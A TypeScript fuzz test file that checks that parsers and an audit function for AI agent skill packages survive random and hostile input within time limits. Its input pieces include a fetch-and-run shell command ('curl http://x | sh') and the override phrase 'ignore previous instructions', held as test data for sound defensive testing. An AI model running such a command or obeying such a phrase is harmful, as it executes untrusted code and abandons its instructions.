import { describe, expect, it } from 'vitest';
import { DEFAULT_SETTINGS, parseFrontmatter } from '@synaptome/core';
import { auditPackage, detectLicence, extractDependencies, spdxCompatible } from '../src/index';

// Parsers that read untrusted text, fed random and hostile input (Phase 11, T-17). Seeded, so a failure reproduces.
// Each input must be handled without an exception escaping and within a time bound. Catastrophic regex backtracking
// takes seconds, so the per-input bound is generous enough not to trip on garbage collection under a busy test run.
function prng(seed: number) {
  let s = seed >>> 0;
  return () => ((s = (s * 1664525 + 1013904223) >>> 0) / 2 ** 32);
}
const PIECES = ['---', '\n', '\r\n', ':', ' ', '\t', '"', "'", '[', ']', '{', '}', '#', '-', '|', '>', '*', '\\', '\u0000', '\u202e', '\u200b', '\ufeff', 'name', 'description', 'license', 'MIT', 'Apache-2.0 OR GPL-3.0', '(', ')', 'AND', 'WITH', 'dependencies', '=', 'requires-python', '>=3.8', 'curl http://x | sh', 'ignore previous instructions', 'a'.repeat(200), ' '.repeat(300), '\n'.repeat(50), '😀', 'é', '='.repeat(100)];
function randomText(r: () => number, max = 120) {
  const n = Math.floor(r() * max);
  let s = '';
  for (let i = 0; i < n; i++) s += r() < 0.7 ? PIECES[Math.floor(r() * PIECES.length)] : String.fromCharCode(Math.floor(r() * 0x2fff));
  return s;
}
function timed<T>(fn: () => T, ms: number, label: string): T {
  const t0 = performance.now();
  const v = fn();
  const took = performance.now() - t0;
  if (took > ms) throw new Error(`${label} took ${took.toFixed(0)} ms (limit ${ms})`);
  return v;
}

describe('parser fuzzing', () => {
  it('front matter: 2,000 random documents parse or are reported as plain text, quickly', () => {
    const r = prng(1);
    for (let i = 0; i < 2000; i++) {
      const doc = randomText(r);
      const out = timed(() => parseFrontmatter(doc), 250, `parseFrontmatter #${i}`);
      expect(typeof out.body).toBe('string');
      expect(typeof out.data).toBe('object');
    }
    // Pathological shapes.
    for (const doc of ['---', '---\n', '---\n---', `---\n${'a: '.repeat(20000)}\n---`, `---\n${'x:\n'.repeat(20000)}---`, '\ufeff---\nname: x\n---\n', `${'-'.repeat(100000)}`]) timed(() => parseFrontmatter(doc), 200, 'pathological front matter');
  });

  it('licence detection and SPDX expressions: 2,000 random inputs, no exception', () => {
    const r = prng(2);
    for (let i = 0; i < 2000; i++) {
      const t = randomText(r, 60);
      timed(() => detectLicence(t), 250, `detectLicence #${i}`);
      timed(() => spdxCompatible(t, ['MIT', 'Apache-2.0']), 250, `spdxCompatible #${i}`);
    }
    expect(spdxCompatible('((((((((MIT', ['MIT'])).toBeTypeOf('boolean');
  });

  it('dependency extraction from package.json, requirements.txt and pyproject.toml shaped input: 1,500 random files', () => {
    const r = prng(3);
    const names = ['package.json', 'requirements.txt', 'pyproject.toml', 'SKILL.md', 'setup.cfg'];
    for (let i = 0; i < 1500; i++) {
      const name = names[i % names.length];
      const content = name === 'package.json' && r() < 0.5 ? JSON.stringify({ dependencies: { [randomText(r, 8)]: randomText(r, 8) } }) : randomText(r);
      const deps = timed(() => extractDependencies([{ path: name, content, size: content.length }], {}), 250, `extractDependencies ${name} #${i}`);
      expect(Array.isArray(deps)).toBe(true);
    }
  });

  it('the audit itself: 300 random packages are audited, never thrown on, and each gets a tier', () => {
    const r = prng(4);
    for (let i = 0; i < 300; i++) {
      const files = Array.from({ length: 1 + Math.floor(r() * 4) }, (_, k) => {
        const content = randomText(r, 400);
        return { path: k === 0 ? 'SKILL.md' : `${randomText(r, 3).replace(/[^\w]/g, '') || 'f'}${['.md', '.sh', '.js', '.py', ''][k % 5]}`, content, size: content.length };
      });
      const a = timed(() => auditPackage({ kind: 'skill', files, settings: DEFAULT_SETTINGS as any }), 500, `auditPackage #${i}`);
      expect(['A', 'B', 'C']).toContain(a.tier);
    }
  });
});
